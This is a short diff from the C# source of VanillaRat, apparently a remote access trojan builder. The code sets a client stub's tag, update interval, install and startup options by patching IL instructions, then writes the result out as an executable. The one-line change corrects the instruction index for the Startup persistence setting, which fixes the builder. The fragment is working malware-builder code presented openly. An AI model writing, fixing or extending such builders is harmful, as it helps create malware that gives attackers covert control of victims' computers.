@@ -34,7 +34,7 @@ namespace VanillaRat.Classes
                         Constructor.Body.Instructions[4].Operand = ClientSettings.ClientTag;
                         Constructor.Body.Instructions[6].Operand = ClientSettings.UpdateInterval;
                         Constructor.Body.Instructions[8].Operand = ClientSettings.Install;
-                        Constructor.Body.Instructions[12].Operand = ClientSettings.Startup;
+                        Constructor.Body.Instructions[10].Operand = ClientSettings.Startup;
                         if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                             Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");
                         Assembly.Write(Environment.CurrentDirectory + @"\Clients\" + Name + ".exe");
